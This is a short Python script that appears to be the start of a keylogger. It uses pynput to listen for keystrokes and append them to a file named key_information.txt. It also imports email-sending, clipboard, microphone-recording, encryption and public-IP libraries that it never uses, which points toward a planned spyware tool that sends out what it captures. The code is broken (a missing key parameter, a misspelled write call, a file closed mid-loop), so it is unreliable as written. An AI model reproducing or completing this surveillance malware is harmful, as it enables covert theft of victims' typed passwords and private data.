
# MIME AND SMTP LIBRAIRIES TO SEND EMAIL
from fileinput import close
from gettext import find
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# SYSTEM BASED LIBRAIRIES
import socket
import platform

# 
import clipboard
from pynput.keyboard import Key, Listener

import os
import time

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import freeze_support, process
#from PIL import ImageGrab





count =0
keys = []

def on_press():
    global count, key

    keys.append(key)
    count += 1

    if count >= 10:
        count =0
        write_file(keys)
        keys=[]


def write_file(keys):
    with open("key_information.txt", 'a') as f:
        for key in keys:
            k= str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
                f.close()
            elif k.find("Key") == -1:
                f.wirte(k)
                f.close()




def on_release(key):
    if key == Key.esc:
        return False




with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()